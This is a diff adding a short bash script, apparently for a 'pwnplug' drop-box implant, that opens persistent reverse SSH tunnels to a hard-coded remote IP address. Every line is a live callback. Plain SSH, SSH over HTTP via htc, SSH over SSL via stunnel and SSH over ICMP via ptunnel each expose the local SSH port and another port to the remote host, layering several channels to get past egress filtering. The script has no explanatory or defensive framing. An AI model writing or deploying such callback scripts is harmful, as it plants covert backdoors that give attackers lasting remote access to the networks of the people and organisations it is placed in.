@@ -1,0 +1,25 @@
+#! /bin/bash
+#Remote IP Addr
+hostip=54.88.76.202
+# Normal reverse SSH
+sleep 5 
+ssh -NR 3333:localhost:22 -i /root/.ssh/id_rsa pwnplug@"$hostip" -p 22 &
+ssh -NR 3993:localhost:5091 -i /root/.ssh/id_rsa pwnplug@"$hostip" -p 22 &
+#End SSh
+#Setting up reverse SSH over HTTP
+htc -F 8081 "$hostip":80 &
+htc -F 8082 "$hostip":80 &
+ssh -NR 3338:localhost:22 -i /root/.ssh/id_rsa pwnplug@localhost -p 8081 &
+ssh -NR 3998:localhost:5091 -i /root/.ssh/id_rsa pwnplug@localhost -p 8082 &
+#End HTTP
+#Setting up reverse SSH tunnel over SSL
+stunnel -c -d 4321 -r "$hostip":443 & 
+stunnel -c -d 4322 -r "$hostip":443 & 
+sleep 10  
+ssh -NR 3336:localhost:22 -i /root/.ssh/id_rsa pwnplug@localhost -p 4321 &
+ssh -NR 3996:localhost:5091 -i /root/.ssh/id_rsa pwnplug@localhost -p 4322 &
+#End SSL
+# Setting up reverse SSH tunnel over ICMP
+ptunnel -lp 7654 -p "$hostip" -da "$hostip" -dp 22 -c eth0 & 
+ssh -NR 3339:localhost:22 -i /root/.ssh/id_rsa pwnplug@localhost -p 7654 &
+#End ICMP
